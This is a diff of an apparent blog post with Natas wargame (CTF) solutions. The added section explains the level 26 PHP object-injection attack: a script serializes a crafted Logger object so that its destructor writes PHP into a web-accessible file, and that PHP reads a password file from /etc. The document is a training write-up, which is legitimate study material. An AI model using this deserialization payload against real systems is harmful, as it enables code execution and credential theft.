@@ -2,7 +2,7 @@
 layout: article
 key: 202003230
 pageview: true
-title: Natas Wargames Solutions (16-34)
+title: Natas Wargames Solutions (16-30)
 tags: ctf
 excerpt: My followup writeup to challenges that I solved in Natas Wargames
 ---
@@ -202,6 +202,75 @@ Note that the log file it is written to has the name natas24_{PHPSESSID}.log. He
 
 We are given a function to add drawings to the web application page. It can be noted that the drawings are being stored as each request adds incremental drawings to the web page. We have to again, tamper with the cookies to solve this challenge. This challenge is similar to level 11 where we needed to reverse the cookie to alter its contents. 
 
-Here we need to carry out a PHAR exploit or inject a serialized variable to our advantage. `drawFromUserdata()` which does a couple things. One, if you sent along coordinates it draws corresponding lines. Second, if you sent along the ‘drawing’ cookie, it deserializes the contents of the cookie and draws accordingly.
+Here we need to carry out a PHAR exploit or inject a serialized variable to our advantage. Serialization is the process of storing an object’s properties in a binary format, which allows it to be passed around or stored on a disk, so it can be unserialized and used at a later time.
 
-Seeing the word ‘unserialize’ in a hacking challenge should cause an alarm to go off in your head. This is what the deserialization looks like:
+`drawFromUserdata()` which does a couple things. One, if you sent along coordinates it draws corresponding lines. Second, if you sent along the ‘drawing’ cookie, it deserializes the contents of the cookie and draws accordingly.
+
+Seeing the word ‘unserialize’ in a hacking challenge should cause alarm bells to go off in your head. 
+Let's look closely at the deserialize function.
+
+```php
+$drawing=unserialize(base64_decode($_COOKIE["drawing"]));
+```
+
+Phar exploits and serialization bugs have one more important thing to note, the things usually go wrong is when the destructor is called. The attacks could be anywhere from file inclusion to arbitary code execution. There is a nice blog detailing this attack type - https://blog.ripstech.com/2018/php-object-injection/ .
+
+What we’re after is the natas27 password file. There are read as well as write privileges to the `img` folder because that’s where web application stores images. 
+
+With all that being said, let us prepare our payload. Check out the Logger class. Both the constructor and destructor write to a file. What file? Whatever is stored in the `$logFile` member variable. What does it write? What ever is stored in the `$initMsg` and `$exitMsg` member variables. 
+
+Recall that the definition of the class does not go along for the ride when an object is serialized. We only need to make a class named Logger, load up the member variables we want, and send it along. The php program to accomplish or goals has been written below.
+
+```php
+<?php
+
+class Logger {
+    private $logFile;
+    private $initMsg;
+    private $exitMsg;
+    
+    function __construct(){
+        $this->initMsg="Initializing object\n";
+        #This is the payload
+        $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>\n";   
+        #This is to retrive the file using file inclusion, we know the img directory has read privileges.
+        #The php extension is important 
+        $this->logFile = "/var/www/natas/natas26/img/file_1.php";
+    }
+}
+
+$logObject = new Logger();
+#This is what the value will be set to the drawingObject
+print base64_encode(serialize($logObject))."\n";
+
+?>
+```
+
+Then , we just need to fetch the file using the URL.
+
+
+
+### Natas 27
+
+*"Whitespaces Matter"*
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+### Natas 28
+
+ECB codeblock abuse
+
